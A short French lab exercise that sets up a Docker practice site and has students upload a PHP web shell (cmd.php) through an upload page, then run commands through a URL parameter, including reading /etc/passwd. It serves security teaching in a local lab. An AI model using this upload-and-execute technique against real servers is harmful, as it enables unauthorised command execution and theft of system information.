Exercice backdoor :   

git clone https://github.com/PercevalFox/mdvp2026_backdoor.git  

A faire dans le repo /mdvp2026_backdoor   

mkdir -p web/uploads  

sudo docker-compose up -d --build  

Aller sur : http://votre_ip:8080/upload.php  

Uploader cmd.php depuis le dossier backdoors/  

Aller sur : http://votre_ip:8080/uploads/cmd.php?cmd=id  

Tester d'autres commandes :  

* ls  
* cat /etc/passwd  
* uname -a  
* a vous de tester des commandes linux =)
